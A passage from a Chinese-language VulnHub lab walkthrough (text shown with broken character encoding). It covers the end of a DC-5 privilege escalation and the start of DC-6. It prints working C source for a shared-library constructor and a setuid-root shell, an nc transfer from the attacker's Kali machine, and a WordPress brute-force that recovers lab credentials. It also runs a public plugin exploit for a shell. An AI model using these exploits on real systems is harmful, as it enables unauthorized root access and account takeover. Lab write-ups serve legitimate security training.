<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001233201455.png" alt="image-20221001233201455"></p>
<p>é¶æœº<code>shell</code>ã€å¿…é¡»åœ¨<code>/tmp</code>ç›®å½•ä¸‹æ‰èƒ½æ‰§è¡Œncã€‘</p>
<blockquote>
<p><code>cd /tmp</code><br><code>nc 192.168.133.140 8888 &gt; libhax.so</code>  &#x2F;&#x2F;&gt;è¡¨ç¤ºä¼ å‡ºæ¥æ”¶æ–‡ä»¶,192.168.133.140ä¸ºkaliæœºip</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001233223666.png" alt="image-20221001233223666"></p>
<p>çœ‹åˆ°ä¼ å…¥æˆåŠŸ</p>
<p><code>rootshell</code>å’Œ<code>flag.sh</code>æ–‡ä»¶ç±»ä¼¼ï¼Œä¸å†å±•ç¤º</p>
<p>æœ€åæˆåŠŸä¼ å…¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002132325197.png" alt="image-20221002132325197"></p>
<h4><span id="3æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ">3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ</span></h4><hr>
<p>ä¼ å…¥å®Œæˆåï¼Œç»™<code>flag.sh</code>åŠ ä¸Šæ‰§è¡Œæƒé™</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x flag.sh</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œå³å¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flag.sh</span><br></pre></td></tr></table></figure>

<hr>
<h5><span id="å‡ºç°æ„å¤–">*<strong>å‡ºç°æ„å¤–</strong></span></h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002173352619.png" alt="image-20221002173352619"></p>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰æœ‹å‹ä¹Ÿé‡åˆ°è¿™ç§æŠ¥é”™</p>
<p>æœ€åä¸€æ­¥æ‰§è¡Œ<code>rootshell</code>çš„æ—¶å€™ï¼Œå¼¹å‡ºè¿™ä¸ªå‘½ä»¤ï¼Œæˆ‘æœç´¢äº†ä¸€ä¸‹ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯cè¯­è¨€è„šæœ¬å†™é”™äº†ï¼Œä½†æ˜¯ä»”ç»†æ£€æŸ¥å¹¶æ²¡æœ‰å‡ºé”™</p>
<p>ç„¶åæˆ‘ä»¬çœ‹äº†çœ‹æˆ‘ä»¬çš„<code>kali</code>å’Œ<code>é¶æœº</code>çš„gccç‰ˆæœ¬</p>
<p>å‘ç°</p>
<blockquote>
<p>kaliæœºæ˜¯ï¼š<code>11.3.0-1</code></p>
<p>é¶æœºæ˜¯ï¼š<code>4.9.2</code></p>
</blockquote>
<p>ä½†æ˜¯ç¼–è¯‘å™¨ä¸åŒå¯¹ç»“æœåº”è¯¥æ²¡ä»€ä¹ˆå¤ªå¤§å½±å“</p>
<p>ä½†æˆ‘è¿˜æ˜¯è¯•è¯•èƒ½ä¸èƒ½åœ¨<code>é¶æœºçš„shell</code>é‡Œæ‰§è¡Œgccï¼Œè¿è¡Œä¸¤ä¸ªcè¯­è¨€è„šæœ¬æ–‡ä»¶ï¼Œå¾—åˆ°<code>rootshell</code>å’Œ<code>libhax.so</code>æ–‡ä»¶</p>
<p>ä½†æ˜¯åˆå‡ºç°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002210307317.png" alt="image-20221002210307317"></p>
<p>åŸæ¥æ˜¯ç¼ºå°‘ç¯å¢ƒå˜é‡ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œ</p>
<h6><span id="ç»™cc1é…ç½®ç¯å¢ƒå˜é‡">ç»™<code>cc1</code>é…ç½®ç¯å¢ƒå˜é‡</span></h6><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002205950588.png" alt="image-20221002205950588"></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">locate cc1</span><br><span class="line"></span><br><span class="line"><span class="title class_">PATH</span>=<span class="string">&quot;$PATH&quot;</span><span class="symbol">:/usr/lib/gcc/x86_64-linux-gnu/</span><span class="number">4.9</span>/cc1</span><br><span class="line"></span><br><span class="line">export <span class="title class_">PATH</span></span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘ä»¬ä»ç®€ï¼Œç›´æ¥åœ¨é¶æœº<code>shell</code>æ‰§è¡Œ</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dropshell</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>



<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="regexp">/tmp/</span>rootshell <span class="regexp">/tmp/</span>rootshell.c</span><br><span class="line">rm -f <span class="regexp">/tmp/</span>rootshell.c</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‰§è¡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002210611503.png" alt="image-20221002210611503"></p>
<h6><span id="å…³é”®æ¥äº†æœŸå¾…">å…³é”®æ¥äº†ã€æœŸå¾…ã€‘</span></h6><p>æˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„<code>flag.sh</code>è„šæœ¬ã€è¿™é‡Œæ˜¯é‡å¤çš„<code>flag.sh</code>ï¼Œæ‰€ä»¥åå­—ä¸º<code>flag.sh.1</code>ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002211351948.png" alt="image-20221002211351948"></p>
<hr>
<p>ç»ˆäºè§£å†³é—®é¢˜åã€å¡äº†ä¸€å¤©äº†ã€‘</p>
<p>ç»ˆäºæˆåŠŸææƒ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002211423172.png" alt="image-20221002211423172"></p>
<p>åˆ°<code>/root</code>ç›®å½•ä¸‹</p>
<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002211550887.png" alt="image-20221002211550887"></p>
<blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">888b</span>    <span class="number">888</span> d8b                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">8888b</span>   <span class="number">888</span> Y8P                                                      <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">88888b</span>  <span class="number">888</span>                                                          <span class="number">888</span>      <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888Y88b</span> <span class="number">888</span> <span class="number">888</span>  .d8888b .d88b.       <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span>  .d88b.  <span class="number">888</span>d888 <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span> Y88b888 <span class="number">888</span> d88P<span class="string">&quot;   d8P  Y8b      888  888  888 d88&quot;</span><span class="string">&quot;88b 888P&quot;</span>   <span class="number">888</span> .<span class="number">88</span>P <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="attribute">888</span>  Y88888 <span class="number">888</span> <span class="number">888</span>     <span class="number">88888888</span>      <span class="number">888</span>  <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>     <span class="number">888888</span>K  Y8P Y8P Y8P </span><br><span class="line"><span class="attribute">888</span>   Y8888 <span class="number">888</span> Y88b.   Y8b.          Y88b <span class="number">888</span> d88P Y88..<span class="number">88</span>P <span class="number">888</span>     <span class="number">888</span> <span class="string">&quot;88b  &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line"><span class="attribute">888</span>    Y888 <span class="number">888</span>  <span class="string">&quot;Y8888P &quot;</span>Y8888        <span class="string">&quot;Y8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  <span class="number">888</span>     <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span>                                                                                                                 </span><br></pre></td></tr></table></figure>


<p><code>Once again, a big thanks to all those who do these little challenges,</code><br><code>and especially all those who give me feedback - again, it&#39;s all greatly</code><br><code>appreciated.  :-)</code></p>
<p><code>I also want to send a big thanks to all those who find the vulnerabilities</code><br><code>and create the exploits that make these challenges possible.</code></p>
<p>ç¿»è¯‘ï¼š                                                                                      </p>
<p>å†æ¬¡éå¸¸æ„Ÿè°¢æ‰€æœ‰å®Œæˆè¿™äº›å°æŒ‘æˆ˜çš„äººï¼Œ<br>å°¤å…¶æ˜¯æ‰€æœ‰ç»™æˆ‘åé¦ˆçš„äººâ€”â€”å†ä¸€æ¬¡ï¼Œè¿™ä¸€åˆ‡éƒ½å¾ˆæ£’<br>èµèµã€‚ :-)</p>
<p>æˆ‘è¿˜è¦éå¸¸æ„Ÿè°¢æ‰€æœ‰å‘ç°æ¼æ´çš„äºº<br>å¹¶åˆ›é€ ä½¿è¿™äº›æŒ‘æˆ˜æˆä¸ºå¯èƒ½çš„æ¼æ´ã€‚</p>
</blockquote>
<p><code>åè¡€äº†ï¼Œæœç„¶æ˜¯ä¸­çº§ï¼Œé¡ºä¾¿æé†’ä¸€ä¸‹å¤§å®¶ï¼Œéå¿…è¦ä¸è¦æ›´æ–°</code></p>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸã€åè¡€äº†ã€‘</strong></p>
<hr>
<h1><span id="å…­-dc-6ä¸­çº§">å…­ã€DC-6[ä¸­çº§]</span></h1><p><strong>only one flag</strong></p>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>å…ˆæŠ¬æ‰‹<code>nmap</code>æ‰«æä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221006214334035.png" alt="image-20221006214334035"></p>
<blockquote>
<p>å‘ç°<br><code>22</code>ç«¯å£ï¼šè¿è¡Œç€<code>ssh</code>ã€é»˜è®¤ç«¯å£ã€‘<br><code>80</code>ç«¯å£ï¼šè¿è¡Œç€<code>http</code>ã€é»˜è®¤ç«¯å£ã€‘</p>
</blockquote>
<p>çœ‹æ¥å¯èƒ½æ˜¯éœ€è¦<code>ssh</code>è¿æ¥æ‹¿<code>shell</code></p>
<hr>
<p>è¿™ä¸ªé¶æœºå¥½åƒéœ€è¦é…ç½®<code>hosts</code>æ–‡ä»¶ï¼Œä¸ç„¶é€šè¿‡<code>ip</code>æ˜¯è®¿é—®ä¸äº†ç½‘ç«™çš„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221006215651658.png" alt="image-20221006215651658"></p>
<p>ç„¶åè®¿é—®è¯•è¯•</p>
<p>å¥½äº†ã€ä½†æ˜¯å¥½åƒæœ‰ç‚¹å¡ã€‘</p>
<p>ç•Œé¢å’Œ<code>DC2</code>ä¸€æ ·ã€æ¢¦å›<code>DC2</code>ï¼Œæ“ä½œåº”è¯¥å·®ä¸å¤šã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221006220758221.png" alt="image-20221006220758221"></p>
<hr>
<p>ä¹ æƒ¯çœ‹çœ‹<code>wappalyzer</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221006221445685.png" alt="image-20221006221445685"></p>
<p>çœ‹åˆ°<code>CMS</code>æ˜¯<code>WordPress 5.1.1</code></p>
<p>æƒ³åˆ°å¯ä»¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œæ‹¿åˆ°ä¸€äº›æ•æ„Ÿä¿¡æ¯</p>
<hr>
<p>æˆ‘ä»¬å†çœ‹çœ‹ç½‘ç«™ä¸Šæœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯</p>
<p><code>about us</code>é‡Œä¼¼ä¹å…¨æ˜¯æ–‡æœ¬å†…å®¹æ²¡å•¥æç¤º</p>
<p>çœ‹åˆ°æœ‰ä¸ª<code>concact us</code>ï¼Œå¯èƒ½æœ‰äº¤äº’åˆ©ç”¨çš„åœ°æ–¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221006222942930.png" alt="image-20221006222942930"></p>
<p>è™½ç„¶çœ‹èµ·æ¥æ²¡æœ‰ä½†æ˜¯å…¶å®æ˜¯æœ‰çš„</p>
<p>é€šè¿‡<code>concact us</code>é¡µé¢çš„urlï¼Œåœ¨åé¢åŠ ä¸Šç”¨æˆ·çš„åå­—å°±å¯ä»¥</p>
<blockquote>
<p><code>http://xxx/admin</code>  </p>
<p>&#x2F;&#x2F;å½“ç„¶å…¶å®å¹¶ä¸å¤ªé‡è¦ï¼Œä¸è¿‡å¯ä»¥è¯•è¯•çœ‹ï¼Œèƒ½ä¸èƒ½ç•™è¨€xssç„¶åæŒŸæŒç®¡ç†å‘˜è´¦æˆ·ï¼Œä¸è¿‡è¿™å¹¶ä¸æ˜¯å®é™…æƒ…å†µï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±ç•™è¨€ï¼Œç„¶åç™»å½•çœ‹çœ‹</p>
</blockquote>
<hr>
<h2><span id="1wpscançˆ†ç ´å‡ºç”¨æˆ·ådc2é‡Œæè¿‡">1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘</span></h2><p>çœ‹åˆ°<code>wordpress</code>å…ˆç”¨<code>wpscan</code>æä¸€ä¸‹</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="comment">--url wordy -e u</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221006235057457.png" alt="image-20221006235057457"></p>
<p>å¾—åˆ°ç”¨æˆ·å</p>
<blockquote>
<p><code>admin</code><br><code>mark</code><br><code>graham</code><br><code>sarah</code><br><code>jens</code></p>
</blockquote>
<p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>user.txt</code></p>
<p>å“ªåœ¨å“ªé‡Œç™»å½•å‘¢ï¼Ÿæˆ‘ä»¬åœ¨å¼€å§‹é¡µé¢å¹¶æ²¡æœ‰çœ‹åˆ°ç™»å½•çª—å£</p>
<p>æˆ‘ä»¬ç”¨<code>dirb</code>æ‰«ä¸€ä¸‹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:<span class="regexp">//</span>wordy</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221009231112282.png" alt="image-20221009231112282"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221009231340911.png" alt="image-20221009231340911"></p>
<hr>
<h2><span id="2wpscançˆ†ç ´å¯†ç ">2.wpscançˆ†ç ´å¯†ç </span></h2><p>æˆ‘ä»¬å†æ‰¾ä¸€ä¸ªå¯†ç è¡¨ï¼Œè¿™é‡Œç”¨å’Œ<code>DC2</code> <code>cewl</code>å‘½ä»¤çˆ¬ä¸€ä¸‹ç½‘ç«™ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨å…¶ä¸­æœ‰æ²¡æœ‰å¯†ç </p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl wordy &gt; <span class="keyword">pass</span>.txt  </span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¾—åˆ°ä¸€ä¸ªå¯†ç ã€æ“¦ï¼Œéš¾é“å’Œ<code>dc2</code>ä¸€æ ·çš„ã€‘</p>
<p>ç„¶åæˆ‘ä»¬å¼€å§‹è¿›è¡Œçˆ†ç ´ç™»å½•ã€æ³¨æ„éœ€è¦<code>root</code>æƒé™ã€‘</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> wordy <span class="attr">--usernames</span> user<span class="selector-class">.txt</span> <span class="attr">--passwords</span> pass<span class="selector-class">.txt</span>                             </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221009231928764.png" alt="image-20221009231928764"></p>
<p>ç»“æœè‚¯å®šæ˜¯ä¸è¡Œçš„ã€è‚¯å®šä¸å’Œ<code>DC2</code>ä¸€æ ·ã€‘</p>
<p>&#x3D;&#x3D;&gt;</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ª<strong>å®Œæ•´çš„å¯†ç å­—å…¸</strong></p>
<blockquote>
<p>éœ€è¦ç”¨åˆ°<code>wordpress</code>çš„å¯†ç å­—å…¸ï¼Œkaliè‡ªå¸¦<code>rockyou.txt</code></p>
</blockquote>
<p>ç”±ä½œè€…æç¤ºå¾—ã€ä¹Ÿå°±æ˜¯æŠŠå¯†ç ä¸€éƒ¨åˆ†å‘Šè¯‰ä½ äº†ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221113171203270.png" alt="image-20221113171203270"></p>
<blockquote>
<p><code>wpscan --url http://wordy --usernames user.txt --passwords /usr/share/wordlists/rockyou.txt|grep k01 -t 5</code></p>
<p>&#x2F;&#x2F;-tæ˜¯æ·»åŠ çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯5ï¼Œå¤šåŠ å‡ ä¸ªå¯ä»¥æ›´å¿«ä¸€äº›</p>
</blockquote>
<p>å¦‚æœç›´æ¥è·‘çš„æœ‰ç‚¹ä¹…äº†</p>
<p><code>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€ç¡äº†ä¸€æ™šä¸Šï¼Œä¸çŸ¥é“å¥½ä¹…è·‘å‡ºæ¥çš„ã€‘</code></p>
<p><code>ã€ä¸ƒåƒä¸‡å¯†ç ã€‘</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010225451565.png" alt="image-20221010225451565"></p>
<p>æœ€åå¾—åˆ°</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010230354224.png" alt="image-20221010230354224"></p>
<blockquote>
<p>username:<code>mark</code><br>password:<code>helpdesk01</code></p>
</blockquote>
<p>è™½ç„¶åªæœ‰ä¸€ä¸ªç”¨æˆ·ä½†æ˜¯å¤Ÿäº†</p>
<hr>
<h2><span id="3ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯">3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯</span></h2><p>ç™»å½•åå‘ç°æ˜¯ä¸€ä¸ª<code>wordpress</code>çš„åå°ç½‘ç«™</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010231254865.png" alt="image-20221010231254865"></p>
<p>åœ¨å·¦ä¾§æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿å«åš</p>
<p><code>Activity monitor</code></p>
<blockquote>
<p>æ˜¯ä¸€æ¬¾ç½‘ç«™ç”¨æˆ·æ´»åŠ¨ç›‘æ§æ’ä»¶ï¼Œæˆ‘ä»¬ç”¨æˆ·ç™»å½•çš„ipå’Œå…¶ä»–ä¿¡æ¯éƒ½ä¼šè¢«ç›‘æ§</p>
<p>&#x2F;&#x2F;é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è¯•è¯•æ‰¾æ‰¾è¿™ä¸ªæ’ä»¶æœ‰æ²¡æœ‰æ¼æ´ï¼Œä»è€Œé€šè¿‡è¿™ä¸ªæ¼æ´æ‹¿åˆ°shellæˆ–è€…å…¶ä»–æ›´é«˜æƒé™ç”¨æˆ·çš„ä¿¡æ¯</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010231223449.png" alt="image-20221010231223449"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010231622962.png" alt="image-20221010231622962"></p>
<p>æˆ‘ä»¬æŸ¥ä¸€ä¸‹</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit activity <span class="literal">monitor</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010231725009.png" alt="image-20221010231725009"></p>
<p>å‘ç°æœç„¶æ˜¯æœ‰çš„ï¼Œåªæ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½åˆ©ç”¨</p>
<p>æˆ‘ä»¬ä¸»è¦æ‰¾åé¢ä¸¤ä¸ªå’Œ<code>wordpress</code>ç›¸å…³çš„</p>
<blockquote>
<p><code>45274.html</code>æ˜¯å‘½ä»¤æ³¨å…¥<br><code>50110.py</code>æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>
</blockquote>
<h3><span id="150110pyæœ‰é—®é¢˜ä¸å»ºè®®ç”¨">1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘</span></h3><p>æ„Ÿè§‰<code>py</code>æ›´æ–¹ä¾¿ä¸€äº›ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010232311464.png" alt="image-20221010232311464"></p>
<p>çœ‹æ¥åªéœ€è¦<code>ip</code>ï¼Œä»¥åŠ<code>ç”¨æˆ·å</code>å’Œ<code>å¯†ç </code>å³å¯è¿›å…¥<code>shell</code></p>
<p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">50110</span>.py</span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘æŒ‰æˆ‘çš„è¾“å…¥</p>
<blockquote>
<p><code>192.168.133.145</code><br><code>mark</code><br><code>helpdesk01</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010232611030.png" alt="image-20221010232611030"></p>
<p>è¿›å…¥<code>shell</code></p>
<hr>
<p>ç„¶åå›ºå®šå§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼<code>shell</code></p>
